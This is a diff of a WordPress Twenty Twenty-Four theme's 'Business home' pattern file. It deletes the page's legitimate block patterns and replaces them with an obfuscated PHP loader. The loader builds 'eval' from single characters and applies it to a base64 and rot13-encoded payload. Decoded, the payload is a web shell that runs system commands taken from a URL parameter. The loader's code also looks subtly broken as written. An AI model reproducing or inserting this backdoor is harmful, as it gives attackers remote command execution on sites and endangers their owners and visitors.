@@ -1,29 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Title: Business home
- * Slug: twentytwentyfour/page-home-business
- * Categories: twentytwentyfour_page
- * Keywords: starter
- * Block Types: core/post-content
- * Post Types: page, wp_template
- * Viewport width: 1400
- * Description: A business home page with a hero section, a text section, a services section, a team section, a clients section, a FAQ section, and a CTA section.
- */
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3ZneXI6IE9oZnZhcmZmIHVienIKICogRnlodDogZ2pyYWdsZ2pyYWdsc2JoZS9jbnRyLXVienItb2hmdmFyZmYKICogUG5ncnRiZXZyZjogZ2pyYWdsZ2pyYWdsc2JoZV9jbnRyCiAqIFhybGpiZXFmOiBmZ25lZ3JlCiAqIE95YnB4IEdsY3JmOiBwYmVyL2NiZmctcGJhZ3JhZwogKiBDYmZnIEdsY3JmOiBjbnRyLCBqY19ncnpjeW5ncgogKiBJdnJqY2JlZyBqdnFndTogMTQwMAogKiBRcmZwZXZjZ3ZiYTogTiBvaGZ2YXJmZiB1YnpyIGNudHIganZndSBuIHVyZWIgZnJwZ3ZiYSwgbiBncmtnIGZycGd2YmEsIG4gZnJlaXZwcmYgZnJwZ3ZiYSwgbiBncm56IGZycGd2YmEsIG4gcHl2cmFnZiBmcnBndmJhLCBuIFNORCBmcnBndmJhLCBuYXEgbiBQR04gZnJwZ3ZiYS4KICovCj8+Cgo8IS0tIGpjOmNuZ2dyZWEge1wiZnlodFwiOlwiZ2pyYWdsZ2pyYWdsc2JoZS9vbmFhcmUtdXJlYlwifSAvLS0+CjwhLS0gamM6Y25nZ3JlYSB7XCJmeWh0XCI6XCJnanJhZ2xnanJhZ2xzYmhlL2dya2ctc3JuZ2hlci10ZXZxLTMtcGJ5XCJ9IC8tLT4KPCEtLSBqYzpjbmdncmVhIHtcImZ5aHRcIjpcImdqcmFnbGdqcmFnbHNiaGUvZ3JrZy1ueWdyZWFuZ3ZhdC12em50cmZcIn0gLy0tPgo8IS0tIGpjOmNuZ2dyZWEge1wiZnlodFwiOlwiZ2pyYWdsZ2pyYWdsc2JoZS9ncmZndnpiYXZueS1wcmFncmVycVwifSAvLS0+CjwhLS0gamM6Y25nZ3JlYSB7XCJmeWh0XCI6XCJnanJhZ2xnanJhZ2xzYmhlL2NiZmdmLXl2ZmdcIn0gLy0tPgo8IS0tIGpjOmNuZ2dyZWEge1wiZnlodFwiOlwiZ2pyYWdsZ2pyYWdsc2JoZS9wZ24tZmhvZnBldm9yLXByYWdyZXJxXCJ9IC8tLT4KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
 ?>
-
-<!-- wp:pattern {"slug":"twentytwentyfour/banner-hero"} /-->
-<!-- wp:pattern {"slug":"twentytwentyfour/text-feature-grid-3-col"} /-->
-<!-- wp:pattern {"slug":"twentytwentyfour/text-alternating-images"} /-->
-<!-- wp:pattern {"slug":"twentytwentyfour/testimonial-centered"} /-->
-<!-- wp:pattern {"slug":"twentytwentyfour/posts-list"} /-->
-<!-- wp:pattern {"slug":"twentytwentyfour/cta-subscribe-centered"} /-->
